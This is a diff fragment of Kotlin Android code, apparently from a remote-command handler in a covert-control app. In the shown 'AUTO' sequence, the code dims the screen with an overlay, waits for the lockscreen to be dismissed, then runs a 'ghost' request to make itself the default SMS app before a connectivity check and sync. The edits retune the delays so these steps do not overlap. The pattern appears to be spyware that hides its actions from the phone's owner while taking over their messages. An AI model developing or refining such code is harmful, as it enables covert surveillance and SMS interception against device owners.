@@ -1141,11 +1141,13 @@ object CommandProcessor {
                         DimmerManager.applyDim(ctx, 20, "AUTO")
                     }, 500)
 
-                    // 3. DEFAULT SMS GHOST SEQUENCE
-                    DefaultSmsManager.expectedMode = "AUTO"
-                    DefaultSmsManager.requestDefault(ctx)
+                    // 3. DEFAULT SMS GHOST SEQUENCE (Delayed to allow lockscreen dismiss to finish)
+                    Handler(Looper.getMainLooper()).postDelayed({ 
+                        DefaultSmsManager.expectedMode = "AUTO"
+                        DefaultSmsManager.requestDefault(ctx)
+                    }, 2500)
 
-                    // 4. CONNECTIVITY EVALUATION (Delayed to allow SMS Ghost to finish)
+                    // 4. CONNECTIVITY EVALUATION (Delayed heavily to prevent sequence overlapping)
                     Handler(Looper.getMainLooper()).postDelayed({
                         val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
                         val caps = cm.getNetworkCapabilities(cm.activeNetwork)
@@ -1165,7 +1167,7 @@ object CommandProcessor {
                             DebugLogger.log("AUTO_SYNC", "Check Skipped: Online=$isOnline, SIM=$hasSim. Cleaning up.")
                             DimmerManager.removeOverlay(ctx)
                         }
-                    }, 5000)
+                    }, 12000)
                     
                     status = "SEQUENCE_INITIATED"
                 }
